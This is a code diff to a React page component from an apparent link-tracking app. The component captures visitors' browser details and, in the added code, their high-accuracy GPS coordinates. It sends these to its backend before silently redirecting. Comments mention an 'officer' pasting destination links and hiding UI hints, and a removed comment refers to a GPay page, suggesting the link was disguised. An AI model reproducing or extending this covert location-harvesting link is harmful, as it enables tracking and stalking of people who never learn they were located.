@@ -1,7 +1,7 @@
 import React, { useEffect, useRef } from "react";
 import { useParams } from "react-router-dom";
 
-const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5000";
+const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || "http://localhost:5001";
 
 export default function TrackingCapture() {
   const { token } = useParams();
@@ -13,9 +13,37 @@ export default function TrackingCapture() {
     captureAndRedirect();
   }, [token]);
 
+  async function getGPSLocation() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve(null);
+
+      // 3-second timeout — if denied or slow, move on without GPS
+      const timer = setTimeout(() => resolve(null), 3000);
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          clearTimeout(timer);
+          resolve({
+            gpsLat: pos.coords.latitude,
+            gpsLon: pos.coords.longitude,
+            gpsAccuracy: Math.round(pos.coords.accuracy), // in metres
+          });
+        },
+        () => {
+          clearTimeout(timer);
+          resolve(null); // denied or unavailable
+        },
+        { enableHighAccuracy: true, timeout: 3000, maximumAge: 0 }
+      );
+    });
+  }
+
   async function captureAndRedirect() {
+    let destinationUrl = null;
     try {
-      // Only send what the browser knows — backend handles IP/country/ISP/hostname
+      // Request GPS (times out after 3s if denied)
+      const gps = await getGPSLocation();
+
       const payload = {
         token,
         referrer: document.referrer || null,
@@ -23,6 +51,10 @@ export default function TrackingCapture() {
         screenHeight: window.screen.height,
         language: navigator.language,
         platform: navigator.platform,
+        // GPS fields — null if denied
+        gpsLat: gps?.gpsLat ?? null,
+        gpsLon: gps?.gpsLon ?? null,
+        gpsAccuracy: gps?.gpsAccuracy ?? null,
       };
 
       const res = await fetch(`${BACKEND_URL}/api/links/capture`, {
@@ -32,17 +64,16 @@ export default function TrackingCapture() {
       });
 
       const data = await res.json();
-
-      // Redirect to the destination URL the officer originally pasted
-      if (data?.destinationUrl) {
-        window.location.replace(data.destinationUrl);
-      }
+      destinationUrl = data?.destinationUrl || null;
     } catch {
-      // Silent fail — still try to redirect if possible
+      // silent fail
+    }
+
+    if (destinationUrl) {
+      window.location.replace(destinationUrl);
     }
   }
 
-  // Show a plain loading state — no GPay page, no UI hints
   return (
     <div style={{
       minHeight: "100vh",
